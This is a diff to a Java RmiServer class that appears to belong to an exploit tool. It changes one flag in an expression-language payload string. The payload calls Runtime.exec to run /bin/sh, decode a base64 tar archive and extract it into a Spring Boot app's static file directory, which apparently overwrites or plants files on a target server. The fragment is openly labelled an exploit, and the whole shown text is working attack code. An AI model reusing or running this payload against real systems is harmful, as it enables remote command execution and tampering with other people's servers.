@@ -18,7 +18,7 @@ public class RmiServer {
 
     // Simple exploit that extracts a base64 encode tar archived into the place where the static files are served
     // from a spring boot app. "split()" is used to create a string arrays with the ELProcessor
-    private static final String EXPLOIT_FORMAT = "Runtime.getRuntime().exec(\"/bin/sh;-c;echo \\\"%s\\\" | base64 -d | tar xvf -\".split(\";\")).waitFor()";
+    private static final String EXPLOIT_FORMAT = "Runtime.getRuntime().exec(\"/bin/sh;-c;echo \\\"%s\\\" | base64 -d | tar zxvf -\".split(\";\")).waitFor()";
     private String getExploit() throws IOException {
         Path path = FileSystems.getDefault().getPath("site.tgz.base64");
         String content = new String(Files.readAllBytes(path));
